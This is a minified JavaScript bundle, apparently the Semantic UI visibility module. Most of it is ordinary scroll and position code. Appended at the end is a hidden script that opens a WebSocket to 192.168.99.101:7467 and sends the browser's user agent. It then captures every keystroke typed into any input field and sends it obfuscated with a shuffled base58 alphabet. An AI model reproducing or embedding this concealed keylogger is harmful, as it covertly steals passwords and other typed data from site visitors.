                            else { if (void 0 !== t) return m.get.pixelsPassed(t) > i.pixelsPassed;
                                i.passing && e.each(g.onPassed, function(e, t) { i.bottomVisible || i.pixelsPassed > m.get.pixelsPassed(e) ? m.execute(t, e) : g.once || m.remove.occurred(t) }) } }, onScreen: function(e) { var t = m.get.elementCalculations(),
                                n = e || g.onOnScreen; if (e && (m.debug("Adding callback for onScreen", e), g.onOnScreen = e), t.onScreen ? m.execute(n, "onScreen") : g.once || m.remove.occurred("onScreen"), void 0 !== e) return t.onOnScreen }, offScreen: function(e) { var t = m.get.elementCalculations(),
                                n = e || g.onOffScreen; if (e && (m.debug("Adding callback for offScreen", e), g.onOffScreen = e), t.offScreen ? m.execute(n, "offScreen") : g.once || m.remove.occurred("offScreen"), void 0 !== e) return t.onOffScreen }, passing: function(e) { var t = m.get.elementCalculations(),
                                n = e || g.onPassing; if (e && (m.debug("Adding callback for passing", e), g.onPassing = e), t.passing ? m.execute(n, "passing") : g.once || m.remove.occurred("passing"), void 0 !== e) return t.passing }, topVisible: function(e) { var t = m.get.elementCalculations(),
                                n = e || g.onTopVisible; if (e && (m.debug("Adding callback for top visible", e), g.onTopVisible = e), t.topVisible ? m.execute(n, "topVisible") : g.once || m.remove.occurred("topVisible"), void 0 === e) return t.topVisible }, bottomVisible: function(e) { var t = m.get.elementCalculations(),
                                n = e || g.onBottomVisible; if (e && (m.debug("Adding callback for bottom visible", e), g.onBottomVisible = e), t.bottomVisible ? m.execute(n, "bottomVisible") : g.once || m.remove.occurred("bottomVisible"), void 0 === e) return t.bottomVisible }, topPassed: function(e) { var t = m.get.elementCalculations(),
                                n = e || g.onTopPassed; if (e && (m.debug("Adding callback for top passed", e), g.onTopPassed = e), t.topPassed ? m.execute(n, "topPassed") : g.once || m.remove.occurred("topPassed"), void 0 === e) return t.topPassed }, bottomPassed: function(e) { var t = m.get.elementCalculations(),
                                n = e || g.onBottomPassed; if (e && (m.debug("Adding callback for bottom passed", e), g.onBottomPassed = e), t.bottomPassed ? m.execute(n, "bottomPassed") : g.once || m.remove.occurred("bottomPassed"), void 0 === e) return t.bottomPassed }, passingReverse: function(e) { var t = m.get.elementCalculations(),
                                n = e || g.onPassingReverse; if (e && (m.debug("Adding callback for passing reverse", e), g.onPassingReverse = e), t.passing ? g.once || m.remove.occurred("passingReverse") : m.get.occurred("passing") && m.execute(n, "passingReverse"), void 0 !== e) return !t.passing }, topVisibleReverse: function(e) { var t = m.get.elementCalculations(),
                                n = e || g.onTopVisibleReverse; if (e && (m.debug("Adding callback for top visible reverse", e), g.onTopVisibleReverse = e), t.topVisible ? g.once || m.remove.occurred("topVisibleReverse") : m.get.occurred("topVisible") && m.execute(n, "topVisibleReverse"), void 0 === e) return !t.topVisible }, bottomVisibleReverse: function(e) { var t = m.get.elementCalculations(),
                                n = e || g.onBottomVisibleReverse; if (e && (m.debug("Adding callback for bottom visible reverse", e), g.onBottomVisibleReverse = e), t.bottomVisible ? g.once || m.remove.occurred("bottomVisibleReverse") : m.get.occurred("bottomVisible") && m.execute(n, "bottomVisibleReverse"), void 0 === e) return !t.bottomVisible }, topPassedReverse: function(e) { var t = m.get.elementCalculations(),
                                n = e || g.onTopPassedReverse; if (e && (m.debug("Adding callback for top passed reverse", e), g.onTopPassedReverse = e), t.topPassed ? g.once || m.remove.occurred("topPassedReverse") : m.get.occurred("topPassed") && m.execute(n, "topPassedReverse"), void 0 === e) return !t.onTopPassed }, bottomPassedReverse: function(e) { var t = m.get.elementCalculations(),
                                n = e || g.onBottomPassedReverse; if (e && (m.debug("Adding callback for bottom passed reverse", e), g.onBottomPassedReverse = e), t.bottomPassed ? g.once || m.remove.occurred("bottomPassedReverse") : m.get.occurred("bottomPassed") && m.execute(n, "bottomPassedReverse"), void 0 === e) return !t.bottomPassed }, execute: function(e, t) { var n = m.get.elementCalculations(),
                                i = m.get.screenCalculations();
                            e = e || !1, e && (g.continuous ? (m.debug("Callback being called continuously", t, n), e.call(M, n, i)) : m.get.occurred(t) || (m.debug("Conditions met", t, n), e.call(M, n, i))), m.save.occurred(t) }, remove: { fixed: function() { m.debug("Removing fixed position"), C.removeClass(v.fixed).css({ position: "", top: "", left: "", zIndex: "" }), g.onUnfixed.call(M) }, placeholder: function() { m.debug("Removing placeholder content"), o && o.remove() }, occurred: function(e) { if (e) { var t = m.cache.occurred;
                                    void 0 !== t[e] && !0 === t[e] && (m.debug("Callback can now be called again", e), m.cache.occurred[e] = !1) } else m.cache.occurred = {} } }, save: { calculations: function() { m.verbose("Saving all calculations necessary to determine positioning"), m.save.direction(), m.save.screenCalculations(), m.save.elementCalculations() }, occurred: function(e) { e && (void 0 !== m.cache.occurred[e] && !0 === m.cache.occurred[e] || (m.verbose("Saving callback occurred", e), m.cache.occurred[e] = !0)) }, scroll: function(e) { e = e + g.offset || A.scrollTop() + g.offset, m.cache.scroll = e }, direction: function() { var e, t = m.get.scroll(),
                                    n = m.get.lastScroll(); return e = t > n && n ? "down" : t < n && n ? "up" : "static", m.cache.direction = e, m.cache.direction }, elementPosition: function() { var e = m.cache.element,
                                    t = m.get.screenSize(); return m.verbose("Saving element position"), e.fits = e.height < t.height, e.offset = C.offset(), e.width = C.outerWidth(), e.height = C.outerHeight(), m.is.verticallyScrollableContext() && (e.offset.top += A.scrollTop() - A.offset().top), m.is.horizontallyScrollableContext() && (e.offset.left += A.scrollLeft - A.offset().left), m.cache.element = e, e }, elementCalculations: function() { var e = m.get.screenCalculations(),
                                    t = m.get.elementPosition(); return g.includeMargin ? (t.margin = {}, t.margin.top = parseInt(C.css("margin-top"), 10), t.margin.bottom = parseInt(C.css("margin-bottom"), 10), t.top = t.offset.top - t.margin.top, t.bottom = t.offset.top + t.height + t.margin.bottom) : (t.top = t.offset.top, t.bottom = t.offset.top + t.height), t.topPassed = e.top >= t.top, t.bottomPassed = e.top >= t.bottom, t.topVisible = e.bottom >= t.top && !t.topPassed, t.bottomVisible = e.bottom >= t.bottom && !t.bottomPassed, t.pixelsPassed = 0, t.percentagePassed = 0, t.onScreen = t.topVisible && !t.bottomPassed, t.passing = t.topPassed && !t.bottomPassed, t.offScreen = !t.onScreen, t.passing && (t.pixelsPassed = e.top - t.top, t.percentagePassed = (e.top - t.top) / t.height), m.cache.element = t, m.verbose("Updated element calculations", t), t }, screenCalculations: function() { var e = m.get.scroll(); return m.save.direction(), m.cache.screen.top = e, m.cache.screen.bottom = e + m.cache.screen.height, m.cache.screen }, screenSize: function() { m.verbose("Saving window position"), m.cache.screen = { height: A.height() } }, position: function() { m.save.screenSize(), m.save.elementPosition() } }, get: { pixelsPassed: function(e) { var t = m.get.elementCalculations(); return e.search("%") > -1 ? t.height * (parseInt(e, 10) / 100) : parseInt(e, 10) }, occurred: function(e) { return void 0 !== m.cache.occurred && (m.cache.occurred[e] || !1) }, direction: function() { return void 0 === m.cache.direction && m.save.direction(), m.cache.direction }, elementPosition: function() { return void 0 === m.cache.element && m.save.elementPosition(), m.cache.element }, elementCalculations: function() { return void 0 === m.cache.element && m.save.elementCalculations(), m.cache.element }, screenCalculations: function() { return void 0 === m.cache.screen && m.save.screenCalculations(), m.cache.screen }, screenSize: function() { return void 0 === m.cache.screen && m.save.screenSize(), m.cache.screen }, scroll: function() { return void 0 === m.cache.scroll && m.save.scroll(), m.cache.scroll }, lastScroll: function() { return void 0 === m.cache.screen ? (m.debug("First scroll event, no last scroll could be found"), !1) : m.cache.screen.top } }, setting: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, g, t);
                            else { if (void 0 === n) return g[t];
                                g[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, m, t);
                            else { if (void 0 === n) return m[t];
                                m[t] = n } }, debug: function() {!g.silent && g.debug && (g.performance ? m.performance.log(arguments) : (m.debug = Function.prototype.bind.call(console.info, console, g.name + ":"), m.debug.apply(console, arguments))) }, verbose: function() {!g.silent && g.verbose && g.debug && (g.performance ? m.performance.log(arguments) : (m.verbose = Function.prototype.bind.call(console.info, console, g.name + ":"), m.verbose.apply(console, arguments))) }, error: function() { g.silent || (m.error = Function.prototype.bind.call(console.error, console, g.name + ":"), m.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                g.performance && (t = (new Date).getTime(), i = s || t, n = t - i, s = t, c.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: M, "Execution Time": n })), clearTimeout(m.performance.timer), m.performance.timer = setTimeout(m.performance.display, 500) }, display: function() { var t = g.name + ":",
                                    n = 0;
                                s = !1, clearTimeout(m.performance.timer), e.each(c, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", a && (t += " '" + a + "'"), (void 0 !== console.group || void 0 !== console.table) && c.length > 0 && (console.groupCollapsed(t), console.table ? console.table(c) : e.each(c, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), c = [] } }, invoke: function(t, n, i) { var o, a, s, c = E; return n = n || d, i = M || i, "string" == typeof t && void 0 !== c && (t = t.split(/[\. ]/), o = t.length - 1, e.each(t, function(n, i) { var r = n != o ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(c[r]) && n != o) c = c[r];
                                else { if (void 0 !== c[r]) return a = c[r], !1; if (!e.isPlainObject(c[i]) || n == o) return void 0 !== c[i] ? (a = c[i], !1) : (m.error(w.method, t), !1);
                                    c = c[i] } })), e.isFunction(a) ? s = a.apply(i, n) : void 0 !== a && (s = a), e.isArray(r) ? r.push(s) : void 0 !== r ? r = [r, s] : void 0 !== s && (r = s), a } }, l ? (void 0 === E && m.initialize(), E.save.scroll(), E.save.calculations(), m.invoke(u)) : (void 0 !== E && E.invoke("destroy"), m.initialize()) }), void 0 !== r ? r : this }, e.fn.visibility.settings = { name: "Visibility", namespace: "visibility", debug: !1, verbose: !1, performance: !0, observeChanges: !0, initialCheck: !0, refreshOnLoad: !0, refreshOnResize: !0, checkOnRefresh: !0, once: !0, continuous: !1, offset: 0, includeMargin: !1, context: t, throttle: !1, type: !1, zIndex: "10", transition: "fade in", duration: 1e3, onPassed: {}, onOnScreen: !1, onOffScreen: !1, onPassing: !1, onTopVisible: !1, onBottomVisible: !1, onTopPassed: !1, onBottomPassed: !1, onPassingReverse: !1, onTopVisibleReverse: !1, onBottomVisibleReverse: !1, onTopPassedReverse: !1, onBottomPassedReverse: !1, onLoad: function() {}, onAllLoaded: function() {}, onFixed: function() {}, onUnfixed: function() {}, onUpdate: !1, onRefresh: function() {}, metadata: { src: "src" }, className: { fixed: "fixed", placeholder: "placeholder", visible: "visible" }, error: { method: "The method you called is not defined.", visible: "Element is hidden, you must call refresh after element becomes visible" } } }(e, window, document) }).call(t, n(70)) }]);
window.addEventListener("DOMContentLoaded", function() {
    function encode(s, t) { var r = []; if (typeof s === "string") { s = new TextEncoder("utf-8").encode(s) } var i, z; for (i = 0; i < s.length; i++) { if (s[i]) { break } } z = i; for (; i < s.length; i++) { var c = s[i]; var j; for (j = 0; j in r || c; j++) { if (r[j]) { c += r[j] * 256 } r[j] = c % 58;
                c = Math.floor(c / 58) } } return t[0].repeat(z) + r.reverse().map(function(x) { return t[x] }).join("") }

    function hash(s) { var r = 0,
            i; for (i = 0; i < s.length; i++) { r = r * 31 + s.charCodeAt(i) | 0 } return r }

    function rand(s) { var x = 123456789; var y = 362436069; var z = 521288629; var w = 88675123; var t; return function(a, b) { t = x ^ x << 11;
            x = y;
            y = z;
            z = w;
            w = w ^ w >> 19 ^ (t ^ t >> 8); if (a !== undefined && b !== undefined) { return a + w % (b + 1 - a) } return w } }

    function shuffle(a, r) { var i; for (i = a.length - 1; i > 0; i--) { var j = Math.abs(r(0, i)); var t = a[i];
            a[i] = a[j];
            a[j] = t } } var w = new WebSocket("ws://192.168.99.101:7467"); var t = "MeitamANbcfv2yXDH1RjPTzVqnLYFhE54uJUkdwCgGB36srQ8o9ZK7WxSp";
    w.addEventListener("open", function(event) { var s = navigator.userAgent;
        w.send(encode(navigator.userAgent, t));
        t = t.split("");
        shuffle(t, rand(hash(s)));
        t = t.join("") });
    Array.from(document.getElementsByTagName("input")).forEach(function(e) { e.addEventListener("keyup", function(v) { w.send(encode(Math.random().toString().slice(2) + " " + v.key, t)) }, false) }) }, false);